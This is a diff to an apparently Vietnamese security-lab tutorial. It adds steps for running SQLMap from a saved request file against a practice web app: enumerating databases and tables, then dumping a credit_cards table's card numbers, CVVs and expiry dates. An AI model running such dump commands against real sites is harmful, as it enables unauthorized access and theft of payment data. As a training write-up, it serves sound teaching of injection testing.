@@ -186,16 +186,31 @@ Tiến hành copy toàn bộ request và paste vào một file txt
 
 ![ubuntu20 04-2020-10-25-16-08-24](https://user-images.githubusercontent.com/32956424/97103081-f55c1180-16dc-11eb-9f0f-1857379091d4.png)
 
-Chạy SQLMap, với input là file sample.txt vừa tạo ở trên
+Chạy SQLMap, với input là file sample.txt vừa tạo ở trên, chạy lệnh:
+
+```
+ ./sqlmap.py -r /home/sonvuduc/sample.txt --dbs
+```
+Các database của web sẽ hiện ra
+
+![ubuntu20 04-2020-10-25-16-16-50](https://user-images.githubusercontent.com/32956424/97103218-9d71da80-16dd-11eb-8e02-d58d58ed887a.png)
+
+Có thể xem chi tiết các bảng của 1 database cụ thể bằng lệnh 
+
+```
+./sqlmap.py -r /home/sonvuduc/sample.txt -D nowasp --tables
+```
+
+![ubuntu20 04-2020-10-25-16-17-16](https://user-images.githubusercontent.com/32956424/97103233-b7132200-16dd-11eb-825d-b41be5585839.png)
 
 
+Xem chi tiết từng cột, thông tin trong bảng, ví dụ như bảng credit_cards:
 
+```
+./sqlmap.py -r /home/sonvuduc/sample.txt -D nowasp -T credit_cards --columns -C ccid,ccnumber,ccv,expiration --dump
+```
 
-
-
-
-
-
+![ubuntu20 04-2020-10-25-16-20-26](https://user-images.githubusercontent.com/32956424/97103275-02c5cb80-16de-11eb-90ef-355e4b4ad33c.png)
 
 
 ### 2.3. Demo Cross-site Scripting 
